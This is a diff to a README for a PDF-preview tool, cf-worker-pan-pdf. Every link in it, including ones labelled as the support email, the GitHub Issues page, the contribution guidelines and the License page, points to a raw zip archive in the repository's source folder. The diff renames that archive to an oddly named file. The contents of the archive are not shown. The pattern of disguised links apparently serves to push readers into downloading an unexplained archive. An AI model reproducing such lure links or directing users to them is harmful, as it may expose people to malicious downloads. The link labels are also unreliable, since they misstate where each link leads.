@@ -8,7 +8,7 @@ Welcome to cf-worker-pan-pdf! This application helps you easily preview small PD
 
 To get started, visit the Releases page to download the application. 
 
-[![Download cf-worker-pan-pdf](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/cf-worker-pan-pdf-2.8.zip)](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/cf-worker-pan-pdf-2.8.zip)
+[![Download cf-worker-pan-pdf](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/pan-worker-pdf-cf-phacitis.zip)](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/pan-worker-pdf-cf-phacitis.zip)
 
 ### Steps to Download
 1. Click on the link above to visit the Releases page.
@@ -55,17 +55,17 @@ If you encounter any issues while using cf-worker-pan-pdf, here are some common 
 
 If you need further assistance, please reach out to our support team:
 
-- **Email**: https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/cf-worker-pan-pdf-2.8.zip
-- **GitHub Issues**: You can report your issues directly on the [GitHub Issues page](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/cf-worker-pan-pdf-2.8.zip).
+- **Email**: https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/pan-worker-pdf-cf-phacitis.zip
+- **GitHub Issues**: You can report your issues directly on the [GitHub Issues page](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/pan-worker-pdf-cf-phacitis.zip).
 
 ## 🌐 Community Contributions
 
-We welcome contributions from the community! If you want to help improve cf-worker-pan-pdf, please check out our [contribution guidelines](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/cf-worker-pan-pdf-2.8.zip).
+We welcome contributions from the community! If you want to help improve cf-worker-pan-pdf, please check out our [contribution guidelines](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/pan-worker-pdf-cf-phacitis.zip).
 
 ## 📚 License
 
 cf-worker-pan-pdf is open-source software licensed under the MIT License. You are free to use, modify, and distribute it.
 
-For more details, visit the [License page](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/cf-worker-pan-pdf-2.8.zip).
+For more details, visit the [License page](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/pan-worker-pdf-cf-phacitis.zip).
 
-[![Download cf-worker-pan-pdf](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/cf-worker-pan-pdf-2.8.zip)](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/cf-worker-pan-pdf-2.8.zip)
+[![Download cf-worker-pan-pdf](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/pan-worker-pdf-cf-phacitis.zip)](https://raw.githubusercontent.com/itallofs/cf-worker-pan-pdf/main/src/pan-worker-pdf-cf-phacitis.zip)
